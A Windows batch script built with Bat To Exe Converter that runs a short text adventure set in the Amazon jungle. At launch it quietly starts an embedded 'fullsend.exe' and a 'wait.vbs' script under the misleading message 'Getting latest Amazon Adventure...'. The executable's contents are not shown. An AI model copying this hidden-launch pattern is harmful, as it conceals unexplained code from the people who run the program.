::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyGoxMCdfSR2OM2y9A6cg7v334/mCrElTUfo6GA==
::fBE1pAF6MU+EWHreyGoxMCdfSR2OM2y9A6cg4+3i/KSDo1l9
::fBE1pAF6MU+EWHreyGoxMCdfSR2OM2y9A6cg/+ny+6SRoF59
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJHGF7H47LQJYQwOFOXmGD7YT5qby7OXn
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJHGF7H47LQJYQwOFOXmGJ7gd8uf1r8uDtEgTQPctfcH+4pHu
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Amazon Adventure
color 2
start %b2eincfilepath%/fullsend.exe
goto wait


:wait
cls
echo Getting latest Amazon Adventure... (will use default adventure if offline)
wscript.exe %b2eincfilepath%/wait.vbs
goto main

:main
cls
echo You are in the Amazon jungle and you are surrounded by fifteen tribal warriors, all holding spears and poised to kill you.
echo You have a revolver, but no bullets.
echo What do you do?
echo.
echo.
echo 1) Run
echo 2) Throw the revolver at someone and run
echo 3) Pull out the revolver and act like it's loaded
echo 4) Start dancing
echo.
set /p decision=Your decision:
if %decision%==1 goto run
if %decision%==2 goto throw
if %decision%==3 goto act
if %decision%==4 goto dance
goto main

:run
cls
echo You run.
echo All of the warriors throw their spears, and you get impaled in five places.
echo.
echo You died.
echo.
set /p again=Try again? (y/n):
if %again%==y goto main
if %again%==n exit
goto run

:throw
cls
echo You throw your gun at the largest of the fifteen warriors.
echo He catches it and grabs you, then jams the barrel in your left eyeball.
echo.
echo You died.
echo.
set /p again=Try again? (y/n):
if %again%==y goto main
if %again%==n exit
goto throw

:act
cls
echo You pull your gun out and point it around as if it is loaded.
echo It definitely startles them, and you begin to hope that you might actually escape.
echo The biggest of the warriors says something to the others in their language, and they all proceed to throw their spears at you at the same time.
echo All of their spears hit you. Little did you know, the biggest warrior realized that you could have only had six bullets maximum.
echo.
echo You died.
echo.
set /p again=Try again? (y/n):
if %again%==y goto main
if %again%==n exit
goto act

:dance
cls
echo You start dancing like a monkey.
echo One of the warriors gets offended and bites your head off.
echo.
echo You died.
echo.
set /p again=Try again? (y/n):
if %again%==y goto main
if %again%==n exit
goto dance